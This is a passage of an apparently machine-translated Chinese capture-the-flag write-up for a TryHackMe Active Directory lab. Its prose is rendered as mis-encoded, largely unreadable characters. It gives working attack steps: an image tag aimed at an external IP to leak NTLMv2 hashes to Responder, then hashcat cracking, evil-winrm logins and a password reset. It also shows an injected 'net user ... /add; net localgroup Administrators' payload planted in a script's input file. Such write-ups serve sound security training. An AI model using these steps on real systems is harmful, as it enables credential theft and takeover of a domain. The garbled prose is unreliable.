translated">å½“æˆ‘ä»¬æ‰“å¼€ä¸å¦ä¸€ä¸ªç”¨æˆ·çš„èŠå¤©æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘è¯¥ç”¨æˆ·å‘é€ä¸€ä¸ª<code class="fe nq nr ns mx b">&lt;img </code>æ ‡è®°ï¼Œå¹¶ä½¿ç”¨å¤–éƒ¨URLä½œä¸ºè¯¥å›¾åƒçš„æ¥æºï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><p id="b4eb" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated"><code class="fe nq nr ns mx b">&lt;img src=[external_ip]/test.img&gt;</code></p><p id="6c95" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">æ¯æ¬¡ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼Œæˆ–è€…ROARæ¨¡å—è‡ªåŠ¨é¢„åŠ è½½é“¾æ¥ï¼Œå¤–éƒ¨æœåŠ¡å™¨å°±ä¼šæ”¶åˆ°å¯¹å›¾åƒçš„è¯·æ±‚ï¼Œä»¥åŠæ¥è‡ªè®¿é—®é“¾æ¥çš„ç”¨æˆ·(å³ä¸ä½ èŠå¤©çš„ç”¨æˆ·)çš„NTLMæ•£åˆ—ï¼</p><p id="c0f1" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">é€šè¿‡è¿è¡Œresponderï¼Œæˆ‘ä»¬å¯ä»¥æ•è·æ•£åˆ—ï¼Œå¹¶ä½¿ç”¨å®ƒä»¬æ¥è®¿é—®ç”¨æˆ·å¸æˆ·å’Œæå‡æˆ‘ä»¬çš„æƒé™(å½“ç„¶è¿™å–å†³äºç”¨æˆ·)ã€‚</p></blockquote><p id="a14c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»ä¸‹è½½ã€å®‰è£…å’Œè¿è¡Œ<a class="ae kc" href="https://github.com/igniterealtime/Spark/releases" rel="noopener ugc nofollow" target="_blank"> Spark 2.8.3 app </a>å¼€å§‹ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="dc5c" class="nb lk iq mx b gy nc nd l ne nf">sudo dpkg -i spark_2_8_3.deb</span></pre><p id="de5a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨å¯åŠ¨Sparkä¹‹åï¼Œæˆ‘æä¾›äº†å‡­è¯å’ŒåŸŸç»†èŠ‚ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/3836742b16706d5452a3f6ce53d04ccb.png" data-original-src="https://miro.medium.com/v2/resize:fit:502/format:webp/1*fltp_HaOFYsFCMZ6UPaY6A.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Sparkç™»å½•ã€‚</figcaption></figure><p id="f0e2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘è¿˜éœ€è¦è¿›å…¥é«˜çº§è®¾ç½®å¹¶é€‰ä¸­ä¸¤ä¸ªæ¡†ï¼Œä»¥é¿å…å‡ºç°è¯ä¹¦é”™è¯¯ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/65bba781844140d41e5a41bc773e19b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:890/format:webp/1*je-bNLrO-xNOX4k7Nb-cGQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç«èŠ±é«˜çº§è®¾ç½®ã€‚</figcaption></figure><p id="cbcc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨ä¹‹å‰åˆ—ä¸¾ç½‘ç«™æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°ç”¨æˆ·<strong class="kf ir"> Buse Candan </strong>çš„å›¾æ ‡æ€»æ˜¯ç»¿è‰²çš„ï¼Œè€Œå…¶ä»–ç”¨æˆ·çš„å›¾æ ‡åœ¨ç°è‰²å’Œç¥ç€è‰²ä¹‹é—´æ³¢åŠ¨ã€‚æˆ‘è®¤ä¸ºè¿™è¡¨æ˜ç”¨æˆ·æ˜¯æ´»è·ƒçš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œåˆ©ç”¨ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/24f41912b7724cb191a3a23c497e3d52.png" data-original-src="https://miro.medium.com/v2/resize:fit:360/format:webp/1*PILdrDcaQDlo3cakcBE3Uw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ´»è·ƒç”¨æˆ·ã€‚</figcaption></figure><p id="7915" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘åœ¨Spark appä¸Šçš„é€šè®¯å½•é‡Œæœç´¢<strong class="kf ir"> Buse </strong>ï¼Œæ‰“å¼€äº†èŠå¤©çª—å£ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/a60d311c0fa2053d9f9e601c5a64e998.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/1*aAl8z9iRNGghzFkcrPxG_w.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ä¸buseçš„ç«èŠ±èŠå¤©ã€‚</figcaption></figure><p id="e0b4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘å¯åŠ¨responderæ¥æ•è·ç”¨æˆ·Buseçš„<strong class="kf ir"> NTMLv2 </strong>å“ˆå¸Œï¼Œå¹¶ä½¿ç”¨å®ƒæ¥è®¿é—®ç”¨æˆ·çš„å¸æˆ·ï¼Œä»è€Œæå‡æˆ‘ä»¬çš„æƒé™ã€‚</p><blockquote class="mm mn mo"><p id="6466" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated"><strong class="kf ir"> Responder </strong>æ˜¯ä¸€æ¬¾ç”¨äºLLMNRã€NBT-NSå’ŒMDNSä¸­æ¯’çš„å¼€æºå·¥å…·ï¼Œå†…ç½®HTTP/SMB/MSSQL/FTP/LDAPæµæ°“è®¤è¯æœåŠ¡å™¨ï¼Œæ”¯æŒNTLMv1/NTLMv2/LMv2ã€æ‰©å±•å®‰å…¨NTLMSSPå’ŒåŸºæœ¬HTTPè®¤è¯ã€‚</p></blockquote><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="7e0e" class="nb lk iq mx b gy nc nd l ne nf">python3 /usr/share/responder/Responder.py -I tun0 -rdwv</span></pre><p id="615a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘å°†å›¾åƒæ ‡ç­¾å‘é€åˆ°ç”¨æˆ·æ€»çº¿ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/e9d8e70c1b66f1cb4862a3b3ff6e2824.png" data-original-src="https://miro.medium.com/v2/resize:fit:994/format:webp/1*MFPSWZIFVBQVZ-dfEe6Yow.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å›¾åƒæ ‡ç­¾ã€‚</figcaption></figure><p id="b49d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Responderæ•è·ä»ç”¨æˆ·æ€»çº¿åˆ°æˆ‘ä»¬å¤–éƒ¨ä¸»æœºçš„GETè¯·æ±‚ï¼Œå…¶ä¸­åŒ…æ‹¬ç”¨æˆ·çš„NTLMv2å“ˆå¸Œï¼</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/e8a78416a6575a922d31b7278cc8dfe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*tMZZZtlQTLOtdnkkerD3Xw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å“åº”ç¨‹åºä¸¤æ¬¡æ•è·ç”¨æˆ·æ€»çº¿çš„NTLMv2å“ˆå¸Œã€‚</figcaption></figure><p id="2b00" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æœ€åï¼Œæˆ‘å¯ä»¥ä½¿ç”¨<strong class="kf ir"> hashcat </strong>æ¥ç ´è§£NTLMv2å“ˆå¸Œå¹¶æ£€ç´¢ç”¨æˆ·Buseçš„å¯†ç ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b002" class="nb lk iq mx b gy nc nd l ne nf">hashcat64.exe -m 5600 hash.txt rockyou.txt</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/d56901c555cca19e0425d10c9f74829c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*oONxzVpNrPwbk5tzGSfZaA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç ´è§£çš„NTLMv2å“ˆå¸Œã€‚</figcaption></figure><p id="3b44" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä½¿ç”¨è¿™äº›å‡­è¯ï¼Œæˆ‘ç°åœ¨å¯ä»¥å°è¯•ä½¿ç”¨<strong class="kf ir"> evil-winrm </strong>ç™»å½•å¹¶è·å¾—ç¬¬äºŒä¸ªæ ‡å¿—ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="9979" class="nb lk iq mx b gy nc nd l ne nf">evil-winrm -i windcorp.thm -u buse -p &lt;...........&gt; -N</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/60fdba731bedb35086ae937f116bc423.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*HpqNW2GpY0CDXb_KVgdAcw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ——å¸œ2ã€‚</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="4ea7" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">Windowsæƒé™æå‡</h1><p id="23e1" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘é¦–å…ˆæ‰§è¡Œä¸€äº›åŸºæœ¬çš„æ‰‹åŠ¨ç”¨æˆ·æšä¸¾ï¼Œå¹¶æ³¨æ„åˆ°ç”¨æˆ·Buseæ˜¯<a class="ae kc" href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#account-operators" rel="noopener ugc nofollow" target="_blank"> Account Operators </a>ç»„çš„æˆå‘˜ï¼Œè¿™å…è®¸æˆ‘ä»¬æ·»åŠ ç”¨æˆ·ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="1ade" class="nb lk iq mx b gy nc nd l ne nf">whoami /groups</span><span id="dc1e" class="nb lk iq mx b gy ng nd l ne nf">Group Name                                  Type                 <br/>=========================================   ================    <br/>Everyone                                    Well-known group                                      <br/>BUILTIN\Users                               Alias                                      <br/>BUILTIN\Pre-Windows 2000 Compatible Access  Alias                                      <br/><strong class="mx ir">BUILTIN\Account Operators                   Alias</strong>                                      <br/>BUILTIN\Remote Desktop Users                Alias                                      <br/>BUILTIN\Remote Management Users             Alias                                     </span></pre><p id="7bad" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ç»§ç»­æˆ‘çš„åˆ—ä¸¾ï¼Œæˆ‘è¿˜åœ¨cç›˜ä¸­å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="kf ir"> scripts </strong>çš„å¯ç–‘æ–‡ä»¶å¤¹ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="ef31" class="nb lk iq mx b gy nc nd l ne nf">*Evil-WinRM* PS C:\&gt; dir</span><span id="dd6b" class="nb lk iq mx b gy ng nd l ne nf">Directory: C:\</span><span id="094c" class="nb lk iq mx b gy ng nd l ne nf">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-----         5/2/2020   6:33 AM                inetpub<br/>d-----        9/15/2018  12:19 AM                PerfLogs<br/>d-r---         5/8/2020   7:43 AM                Program Files<br/>d-----         5/7/2020   2:51 AM                Program Files (x86)<br/><strong class="mx ir">d-----         5/3/2020   5:48 AM                scripts</strong><br/>d-----        5/29/2020   5:45 PM                Shared<br/>d-r---         5/2/2020   3:05 PM                Users<br/>d-----        5/30/2020   7:00 AM                Windows</span></pre><p id="5c84" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">scriptsæ–‡ä»¶å¤¹åŒ…å«ä¸€ä¸ªåä¸º<strong class="kf ir"> checkservers.ps1 </strong>çš„PowerShellè„šæœ¬ï¼Œç”¨äºæ£€æŸ¥ä½äºâ€œ<em class="lb"> C:\Users\brittanycr\ </em>ä¸­çš„åä¸º<strong class="kf ir"> hosts.txt </strong>çš„æ–‡ä»¶ï¼Œå¹¶å°†ä¸»æœºæ–‡ä»¶çš„å†…å®¹ä¼ é€’ç»™<a class="ae kc" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2" rel="noopener ugc nofollow" target="_blank"><strong class="kf ir">Invoke-Expression</strong></a>ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/c59e3073f2b501a28ecbb265ef7dafbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/1*C-pa1PFwkOlBYjJgQin-NA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">PowerShellè„šæœ¬ç‰‡æ®µã€‚</figcaption></figure><p id="a94f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹hosts.txtæ–‡ä»¶å¹¶åŒ…å«ä¸€ä¸ªæ·»åŠ æ–°ç”¨æˆ·çš„å‘½ä»¤ï¼Œå®ƒå°†ä½œä¸ºç®¡ç†å‘˜æ‰§è¡Œã€‚ä¸ºæ­¤ï¼Œæˆ‘å¯ä»¥æ›´æ”¹ç”¨æˆ·<strong class="kf ir"> brittanycr </strong>çš„å‡­è¯ï¼Œå› ä¸ºbuseæ˜¯Account Operatorsç»„çš„æˆå‘˜ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b2b4" class="nb lk iq mx b gy nc nd l ne nf">*Evil-WinRM* PS C:\scripts&gt; <strong class="mx ir">net user brittanycr SecretPass1234 /domain</strong></span><span id="d742" class="nb lk iq mx b gy ng nd l ne nf">The command completed successfully.</span></pre><p id="c4f2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘æ— æ³•ä½¿ç”¨evil-winrmä¸<strong class="kf ir"> brittanycr </strong>ç”¨æˆ·å»ºç«‹è¿œç¨‹è¿æ¥ã€‚ä¹‹å‰ï¼Œæˆ‘å·²ç»æ³¨æ„åˆ°å¯ä»¥é€šè¿‡SMBè®¿é—®<strong class="kf ir">ç”¨æˆ·</strong>æ–‡ä»¶å¤¹ã€‚æˆ‘åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„hosts.txtæ–‡ä»¶ï¼Œå¹¶åŒ…å«ä¸€ä¸ªå‘½ä»¤ï¼Œå½“æ‰§è¡Œè¯¥å‘½ä»¤æ—¶ï¼Œå°†æ·»åŠ ä¸€ä¸ªåä¸º<strong class="kf ir">hack activities</strong>çš„æ–°ç”¨æˆ·ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="601e" class="nb lk iq mx b gy nc nd l ne nf">; net user hacktivities Pass1234$ /add; net localgroup Administrators hacktivities /add</span></pre><p id="8d5c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨smbclienté€šè¿‡brittanycrçš„å‡­è¯è¿æ¥åˆ°ç”¨æˆ·å…±äº«ï¼Œå¹¶ä»æˆ‘çš„æ”»å‡»æœºå™¨ä¸Šä¼ æ–°çš„hosts.txtæ–‡ä»¶ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="1a66" class="nb lk iq mx b gy nc nd l ne nf">smbclient //10.10.252.35/Users -U brittanycr</span><span id="5b7c" class="nb lk iq mx b gy ng nd l ne nf"><br/>smb: \&gt; cd brittanycr\<br/>smb: \brittanycr\&gt; dir<br/>  .                           D        0  Sun May  3 00:36:46 2020<br/>  ..                          D        0  Sun May  3 00:36:46 2020<br/>  hosts.txt                   A       22  Sun May  3 14:44:57 2020</span><span id="6e70" class="nb lk iq mx b gy ng nd l ne nf">smb: \brittanycr\&gt; <strong class="mx ir">put hosts.txt</strong><br/>putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)</span></pre><p id="055d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸ºäº†æ£€æŸ¥ç”¨æˆ·é»‘å®¢æ´»åŠ¨æ˜¯å¦å·²ç»è¢«æ·»åŠ ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨<strong class="kf ir"> crackmapexec </strong>æ¥éªŒè¯å®ƒçš„å­˜åœ¨ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="11d1" class="nb lk iq mx b gy nc nd l ne nf">crackmapexec smb windcorp.thm -u hacktivities -p Pass1234$</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oc"><img src="../Images/11515f73c6908d2f592ec67e4860b787.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*43Q_NfiQMNHfIVOimJYWXg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å¸æˆ·å·²æˆåŠŸæ·»åŠ ã€‚</figcaption></figure><p id="35d0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°å¸æˆ·å·²æˆåŠŸæ·»åŠ ã€‚æˆ‘ç°åœ¨å¯ä»¥ä½¿ç”¨evil-winrmç™»å½•å¹¶æ£€ç´¢æœ€ç»ˆçš„æ ‡å¿—ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/ab148d66efe010b5c245d3aa998fbf36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*b1VEycwWvLx8MkWT6HtQEg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ——å¸œ3ã€‚</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="de19" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æœ€åçš„æƒ³æ³•</h1><p id="f369" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œï¼Œå¹¶æœ‰æœºä¼šå­¦ä¹ æ›´å¤šå…³äºåˆ©ç”¨Active DirectoryåŸŸæ§åˆ¶å™¨çš„çŸ¥è¯†ã€‚æŒ‘æˆ˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„è¿›å±•ï¼Œéœ€è¦è‰¯å¥½çš„è®¡æ•°æŠ€èƒ½æ¥å®Œæˆã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p><div class="oe of gp gr og oh"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="oi ab fo"><div class="oj ab ok cl cj ol"><h2 class="bd ir gy z fp om fr fs on fu fw ip bi translated">ç½‘ç»œå®‰å…¨åŸ¹è®­</h2><div class="oo l"><h3 class="bd b gy z fp om fr fs on fu fw dk translated">TryHackMeæ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦</h3></div><div class="op l"><p class="bd b dl z fp om fr fs on fu fw dk translated">tryhackme.com</p></div></div><div class="oq l"><div class="or l os ot ou oq ov jw oh"/></div></div></a></div></div></div>    
</body>
</html>